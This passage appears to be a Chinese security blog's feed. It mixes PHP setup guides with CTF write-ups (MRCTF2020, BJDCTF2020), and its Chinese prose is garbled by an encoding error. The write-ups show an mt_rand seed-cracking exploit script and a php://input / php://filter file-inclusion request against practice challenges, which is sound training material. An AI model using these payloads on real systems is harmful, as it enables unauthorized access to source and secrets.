class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦å¾—åˆ°<code>private_key</code>ï¼Œå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬è¦çˆ†ç ´å¾—åˆ°ç§å­ï¼Œè¿è¡Œä¸‹é¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line"></span><br><span class="line">$public_key = <span class="string">'KVQP0LdJKRaV3n9D'</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($public_key);$i++)&#123;</span><br><span class="line">    $pos =  strpos($strings1,$public_key[$i]);</span><br><span class="line">    <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($strings1)<span class="number">-1</span>).<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æŒ‡å®šæ ¼å¼åï¼Œæˆ‘ä»¬å»çˆ†ç ´ç§å­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç§å­ä¸º<code>1775196155</code></p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line">public_key();</span><br><span class="line"><span class="comment">//echo $Public_key;</span></span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br></pre></td></tr></table></figure><p>è‡³äºè¿™é‡Œä¸ºä»€ä¹ˆè¦å…ˆè°ƒç”¨<code>public_key()</code>ï¼Œå› ä¸ºæºç é‡Œè°ƒç”¨äº†<code>public_key()</code>ï¼Œè¿™å°±æ„å‘³ç€ä¼ªéšæœºæ•°çš„å‰16ä½æ˜¯<code>public_key</code>ï¼Œå12ä½æ‰æ˜¯<code>private_key</code></p><p>å°±åšäº†è¿™ä¹ˆå¤šï¼Œå‰©ä¸‹çš„ä¸¤é¢˜æœ‰ç‚¹éš¾ï¼Œä¼šç»§ç»­åŠªåŠ›ï¼ˆé€ƒï½</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;MRCTF2020_web(éƒ¨åˆ†)&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>macä¸‹ä½¿ç”¨phpizeå®‰è£…phpæ‰©å±•</title>
    <link href="http://0clickjacking0.github.io/2020/03/04/mac%E4%B8%8B%E4%BD%BF%E7%94%A8phpize%E5%AE%89%E8%A3%85php%E6%89%A9%E5%B1%95/"/>
    <id>http://0clickjacking0.github.io/2020/03/04/macä¸‹ä½¿ç”¨phpizeå®‰è£…phpæ‰©å±•/</id>
    <published>2020-03-03T16:13:03.000Z</published>
    <updated>2020-03-04T05:03:04.269Z</updated>
    
    <content type="html"><![CDATA[<p>macä¸‹ä½¿ç”¨phpizeå®‰è£…phpæ‰©å±•</p><a id="more"></a><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨PHPç¬¬ä¸€æ¬¡ç¼–è¯‘çš„æ—¶å€™æ²¡æœ‰é€‰æ‹©ç¼–è¯‘è¿™ä¸ªåº“ï¼Œä½†æ˜¯åˆ°åæ¥åˆè¦ç”¨ï¼Œpeclä¸­åˆæ‰¾ä¸åˆ°å¯¹åº”çš„åŒ…ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åªèƒ½ç¼–è¯‘æºç æ¥å®‰è£…äº†</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>é¦–å…ˆæˆ‘ä»¬æ‰¾åˆ°è‡ªå·±å¯¹åº”phpç‰ˆæœ¬çš„æºç ï¼Œ<a href="https://www.php.net/releases/" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><p>ä¸‹è½½å®Œæˆä¹‹åè§£å‹</p><p>è¿™é‡Œæˆ‘ä»¥5.6.40ä¸ºä¾‹ï¼Œè¿›å…¥åˆ°ä½ æƒ³è¦å®‰è£…åº“çš„ç›®å½•ï¼Œè¿™é‡Œä¸ºä»¥å®‰è£…gdåº“æ¥è¯´æ˜</p><p><img src="http://images.xianyu123.club/php_ext1.png" alt></p><p>gdæ‰©å±•ä¸»è¦ä¾èµ–zlibï¼Œfreetypeï¼Œlibpngï¼Œlibjpegè¿™4ä¸ªåº“</p><p>æ‰€ä»¥æˆ‘ä»¬å…ˆè¿›è¡Œå®‰è£…</p><p>ä¾æ¬¡æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew install zlib</span><br><span class="line">brew install freetype</span><br><span class="line">brew install libpng</span><br><span class="line">brew install libjpeg</span><br></pre></td></tr></table></figure><p>è¿›å…¥åˆ°å¯¹åº”çš„æ–‡ä»¶å¤¹åï¼Œè¾“å…¥phpizeï¼ŒæˆåŠŸçš„è¯ä¼šæ˜¾ç¤ºå¯¹åº”çš„ä¿¡æ¯</p><p><img src="http://images.xianyu123.club/php_ext2.png" alt></p><p>æ‰§è¡Œå³å¯ï¼Œè¿™é‡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ä¸ä¸€å®šè·Ÿæˆ‘çš„ä¸€æ ·ï¼Œè¦å†™å¯¹è·¯å¾„ï¼Œä¼šå‡ºé”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --with-php-config=/Users/xianyu123/.phpbrew/php/php-5.6.40/bin/php-config --with-jpeg-dir=/usr/local/opt/libjpeg --with-png-dir=/usr/local/opt/libpng --with-freetype-dir=/usr/local/opt/freetype --with-zlib-dir=/usr/local/opt/zlib</span><br></pre></td></tr></table></figure><p>å…¶ä¸­â€“with-php-configæ˜¯æŒ‡å‘å®‰è£…phpåç”Ÿæˆçš„ä¸€ä¸ªé…ç½®å·¥å…·,ä¸»è¦ç”¨äºæ‰©å±•çš„ç¼–è¯‘é…ç½®</p><p>å…¶ä»–çš„å‚æ•°å¯¹åº”æŒ‡å‘å…ˆå‰å®‰è£…ä¾èµ–çš„ä½ç½®</p><p>ç„¶åæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šåœ¨è‡ªå·±çš„phpæ‰©å±•ä¸­å‡ºç°<code>gd.so</code>ï¼Œè¿™è¯´æ˜æˆ‘ä»¬å®‰è£…æˆåŠŸäº†</p><p><img src="http://images.xianyu123.club/php_ext6.png" alt></p><p>æˆ‘ä»¬åªéœ€è¦åœ¨php.iniä¸­åŠ å…¥ä¸€è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=gd.so</span><br></pre></td></tr></table></figure><p>ç„¶åé‡å¯php-fpmå³å¯å®Œæˆ</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;macä¸‹ä½¿ç”¨phpizeå®‰è£…phpæ‰©å±•&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>phpæ— å‚æ•°RCEå°ç»“</title>
    <link href="http://0clickjacking0.github.io/2020/02/12/php%E6%97%A0%E5%8F%82%E6%95%B0RCE%E5%B0%8F%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2020/02/12/phpæ— å‚æ•°RCEå°ç»“/</id>
    <published>2020-02-12T13:38:18.000Z</published>
    <updated>2020-02-14T03:02:02.934Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$functions = get_defined_functions();</span><br><span class="line"><span class="comment">//print_r($functions);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($functions[<span class="string">'internal'</span>] <span class="keyword">as</span> $function_name)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^[a-zA-Z]+$/'</span>,$function_name,$match))</span><br><span class="line">            <span class="keyword">echo</span> $match[<span class="number">0</span>].PHP_EOL;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span
      
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>mac+phpstorm+php5.6+chrome+xdebugé…ç½®</title>
    <link href="http://0clickjacking0.github.io/2020/02/11/mac-phpstorm-php5-6-xdebug%E9%85%8D%E7%BD%AE/"/>
    <id>http://0clickjacking0.github.io/2020/02/11/mac-phpstorm-php5-6-xdebugé…ç½®/</id>
    <published>2020-02-11T02:52:31.000Z</published>
    <updated>2020-05-22T11:59:26.917Z</updated>
    
    <content type="html"><![CDATA[<p>mac+phpstorm+php5.6+chrome+xdebugé…ç½®</p><a id="more"></a><h2 id="0-ç¯å¢ƒè¯´æ˜"><a href="#0-ç¯å¢ƒè¯´æ˜" class="headerlink" title="0. ç¯å¢ƒè¯´æ˜"></a>0. ç¯å¢ƒè¯´æ˜</h2><p>macos15.2</p><p>php5.6</p><p>Phpstorm2018.2</p><p>nginx1.17</p><h2 id="1-å®‰è£…xdebug"><a href="#1-å®‰è£…xdebug" class="headerlink" title="1. å®‰è£…xdebug"></a>1. å®‰è£…xdebug</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pecl install xdebug-2.5.5</span><br></pre></td></tr></table></figure><h2 id="2-é…ç½®php-ini"><a href="#2-é…ç½®php-ini" class="headerlink" title="2. é…ç½®php.ini"></a>2. é…ç½®php.ini</h2><p>å®‰è£…å®Œæˆ<code>xdebug</code>åä¼šæœ‰æç¤ºè¯­å¥</p><p><img src="http://images.xianyu123.club/xdebug2.png" alt></p><p>æ ¹æ®æç¤ºæˆ‘ä»¬æŠŠä¸‹é¢è¿™å¥è¯å¤åˆ¶åˆ°<code>php.ini</code>ä¸­ï¼Œå› ä¸ºæˆ‘ç”¨çš„æ˜¯phpbrewï¼Œæ‰€ä»¥è·¯å¾„å¯èƒ½æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå¤§å®¶æ ¹æ®è‡ªå·±å®é™…<code>php.ini</code>çš„ä½ç½®è¿›è¡Œé…ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_extension=/Users/xianyu123/.phpbrew/php/php-5.6.40/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬é‡å¯ä¸€ä¸‹<code>php-fpm</code>ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œåœ¨ç½‘é¡µç«¯æ‰“å¼€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡ºç°å¦‚ä¸‹ï¼Œåˆ™è¯´æ˜phpç«¯å·²ç»é…ç½®æˆåŠŸäº†</p><p><img src="http://images.xianyu123.club/xdebug1.png" alt></p><h2 id="3-é…ç½®phpstormè°ƒè¯•åŠŸèƒ½"><a href="#3-é…ç½®phpstormè°ƒè¯•åŠŸèƒ½" class="headerlink" title="3. é…ç½®phpstormè°ƒè¯•åŠŸèƒ½"></a>3. é…ç½®phpstormè°ƒè¯•åŠŸèƒ½</h2><p>å…ˆæŠŠä¸‹é¢çš„é…ç½®æ·»åŠ åˆ°<code>php.ini</code>ä¸­ï¼Œç„¶åé‡å¯php-fpm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_handler = dbgp</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">xdebug.remote_port = 9001</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨phpstormçš„èœå•æ <code>Preferences</code>ä¸­æ‰¾åˆ°<code>Debug</code>ï¼Œå¡«å†™ç«¯å£ä¸º<code>9001</code></p><p><img src="http://images.xianyu123.club/xdebug3.png" alt></p><p>ç„¶åå¡«å†™</p><p>IDE keyï¼šåˆšæ‰å†™å…¥<code>php.ini)</code>ä¸­</p><p>hostï¼š127.0.0.1</p><p>portï¼šé¡¹ç›®è¿è¡Œç«¯å£ï¼Œæˆ‘æ˜¯ç”¨82ç«¯å£æ­å»ºçš„ï¼Œæœ‰äº›å¸ˆå‚…å¯èƒ½æ˜¯80</p><p><img src="http://images.xianyu123.club/xdebug4.png" alt></p><p>ç„¶ååœ¨serversä¸­é…ç½®ä¿¡æ¯</p><p>Nameï¼šéšä¾¿å–</p><p>Hostï¼š127.0.0.1</p><p>Portï¼šæŒ‰ç…§ä½ çš„é¡¹ç›®è¿è¡Œç«¯å£</p><p>Debuggerï¼šæŒ‰ç…§ä¸‹å›¾çš„</p><p><img src="http://images.xianyu123.club/20200522195638.png" alt="image-20200211155643870"></p><h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><p>æ‰“å¥½æ–­ç‚¹ï¼Œç„¶åç‚¹å‡»è¿™ä¸ªç»¿è‰²çš„å°è™«å­</p><p><img src="http://images.xianyu123.club/xdebug5.png" alt></p><p>æŒ‰è¿™ä¸ªä¸€æ­¥ä¸€æ­¥è°ƒè¯•</p><p><img src="http://images.xianyu123.club/xdebug6.png" alt></p><p>å‡ºç°è¿™æ ·è¯´æ˜é…ç½®æˆåŠŸäº†</p><p><img src="http://images.xianyu123.club/xdebug7.png" alt></p><h2 id="4-chromeè°ƒè¯•é…ç½®"><a href="#4-chromeè°ƒè¯•é…ç½®" class="headerlink" title="4. chromeè°ƒè¯•é…ç½®"></a>4. chromeè°ƒè¯•é…ç½®</h2><p>å…ˆä¸‹è½½æ‰©å±•</p><p>å³é”®æ‰©å±•é€‰é¡¹ï¼Œåœ¨IDE keyä¸­é€‰æ‹©phpstormï¼Œç„¶åä¿å­˜ï¼Œè¿™é‡Œåå­—ä¸èƒ½è¢«ä¿®æ”¹ï¼Œåªèƒ½ç”¨<code>PHPSTORM</code></p><p><img src="http://images.xianyu123.club/xdebug8.png" alt></p><p>ç„¶ååœ¨ç½‘é¡µæ‰“å¼€phpï¼Œé€‰æ‹©debug</p><p><img src="http://images.xianyu123.club/xdebug9.png" alt></p><p>å¹¶ä¸”åœ¨phpstormä¸­å¼€å¯è¿™ä¸ªç”µè¯æŒ‰é’®ï¼Œå˜æˆç»¿è‰²</p><p><img src="http://images.xianyu123.club/xdebug11.png" alt></p><p>ç„¶ååœ¨phpstormä¸­å°±æœ‰å¼¹çª—ï¼Œé€‰æ‹©åŒæ„ï¼Œè¿™æ ·å°±å¯ä»¥å¿«ä¹çš„è°ƒè¯•äº†</p><p><img src="http://images.xianyu123.club/xdebug10.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac+phpstorm+php5.6+chrome+xdebugé…ç½®&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>BJDCTF2020å¤ç°</title>
    <link href="http://0clickjacking0.github.io/2020/02/08/BJDCTF2020%E5%A4%8D%E7%8E%B0/"/>
    <id>http://0clickjacking0.github.io/2020/02/08/BJDCTF2020å¤ç°/</id>
    <published>2020-02-08T04:59:43.000Z</published>
    <updated>2020-02-09T01:50:11.147Z</updated>
    
    <content type="html"><![CDATA[<p>ç”±äºä¸æ˜¯æœ¬æ ¡å­¦ç”Ÿï¼Œæ‰€ä»¥æˆ‘åœ¨<a href="https://buuoj.cn/challenge" target="_blank" rel="noopener">buuctf</a>å¤ç°äº†ä¸€æ³¢</p><a id="more"></a><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><code>.git</code>æºç æ³„æ¼ï¼Œç”¨å·¥å…·<code>Git_Extract</code>å¾—åˆ°<code>index.php</code>çš„æ ¸å¿ƒä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;%</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆä½¿ç”¨<code>php://input</code>è¾“å…¥æµå’Œ<code>php://filter</code>è¿‡æ»¤å™¨è¿›è¡Œè¯»å–</p><p>è¯·æ±‚åŒ…</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?text=php://input&amp;file=php://filter/convert.base64-encode/resource=next.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 79240f88-1651-412e-a5ae-f80e1d0c144c.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 14</span><br><span class="line"></span><br><span class="line">I have a dream</span><br></pre></td></tr></table></figure><p>è¿”å›åŒ…</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: openresty</span><br><span class="line"><span class="attribute">Date</span>: Sat, 08 Feb 2020 04:56:41 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 432</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.40</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;h1&gt;I have a 